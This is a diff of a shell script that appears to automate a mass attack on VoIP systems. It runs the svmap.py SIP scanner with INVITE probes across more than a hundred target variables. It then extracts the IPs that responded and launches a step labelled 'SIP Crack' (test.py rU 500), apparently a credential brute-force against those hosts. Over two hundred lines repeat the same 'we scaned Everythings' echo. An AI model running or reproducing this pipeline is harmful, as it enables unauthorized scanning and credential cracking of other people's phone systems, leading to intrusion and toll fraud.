+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR152 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR153----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR153 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR154----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR154 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR155----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR155 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR156----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR156 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR157----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR157 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR158----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR158 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR159----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR159 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR160----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR160 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR161----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR161 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR162----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR162 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR163----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR163 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR164----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR164 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR165----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR165 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR166----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR166 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR167----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR167 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR168----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR168 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR169----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR169 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR170----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR170 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR171----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR171 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR172----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR172 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR173----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR173 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR174----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR174 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR175----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR175 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR176----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR176 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR177----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR177 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR178----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR178 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR179----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR179 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR180----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR180 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR181----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR181 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR182----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR182 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR183----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR183 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR184----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR184 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR185----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR185 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR186----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR186 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR187----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR187 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR188----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR188 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR189----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR189 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR190----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR190 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR191----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR191 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR192----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR192 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR193----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR193 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR194----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR194 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR195----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR195 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR196----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR196 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR197----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR197 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR198----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR198 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR199----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR199 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR200----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR200 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR201----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR201 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR202----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR202 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR203----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR203 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR204----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR204 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR205----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR205 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR206----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR206 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR207----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR207 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR208----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR208 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR209----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR209 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR210----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR210 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR211----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR211 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR212----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR212 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR213----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR213 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR214----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR214 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR215----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR215 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR216----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR216 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR217----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR217 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR218----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR218 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR219----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR219 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR220----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR220 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR221----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR221 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR222----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR222 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR223----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR223 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR224----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR224 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR225----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR225 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR226----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR226 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR227----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR227 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR228----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR228 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR229----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR229 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR230----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR230 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR231----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR231 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR232----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR232 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR233----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR233 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR234----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR234 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR235----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR235 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR236----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR236 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR237----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR237 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR238----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR238 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR239----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR239 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR240----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR240 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR241----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR241 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR242----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR242 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR243----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR243 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR244----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR244 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR245----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR245 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR246----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR246 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR247----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR247 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR248----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR248 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR249----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR249 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR250----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR250 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR251----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR251 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR252----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR252 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR253----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR253 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR254----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR254 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR255----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR255 -m INVITE -v >> result.txt
+
+
+
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+sleep 5
+
+echo -e "\nEnding scanning port !\n"
+
 # SIP Responses
 
 echo -e "\nStart SIP Responses ...\n"
 
-grep -Po "(\d+\.){3}\d+:?(\d?){6}" oOoOoOok.txt >>IPSSS
-cat IPSSS | perl -lane 'use warnings; use strict; for my $i (@F){if ($i =~/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[1-9])\.)(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){2}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/) { print $i; } }' > IPS
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" =212result.txt > IPS
 perl run IPS
 cat 401.pal 400.pal 403.pal 404.pal 500.pal >> ipSIP.txt
 rm IPS # remove the file IPS
-sleep 2
+mv =212result.txt =212.txt # change file name
+sleep 1
 
 echo -e "\nEnding Responses !\n"
 
 # ip extractor
 echo -e "\nStart ip extractor ...\n"
 
-grep -Po "([0-2]?\d?\d\.){3}[0-2]?\d?\d" ipSIP.txt > ipGOOD.txt
+grep -Po "([0-2]?\d?\d\.){3}[0-2]?\d?\d" =212.txt > ipGOOD.txt
 sort -u ipGOOD.txt > ipsssss.txt
 rm ipSIP.txt # remove the file IPS
 rm ipGOOD.txt
@@ -33,13 +1325,13 @@ rm *.pal # remove the file
 
 echo -e "\nEnding Check the validity of the IPs !\n"
 
-# scan VOIP
+# scan SIP Crack
 
-echo -e "\nStart crack ...\n"
+echo -e "\nStart SIP Crack ...\n"
 
-python test.py rU 2500
+python test.py rU 500
 
-echo -e "\nEnding crack !\n"
+echo -e "\nEnding SIP Crack !\n"
 
 sleep 5
 
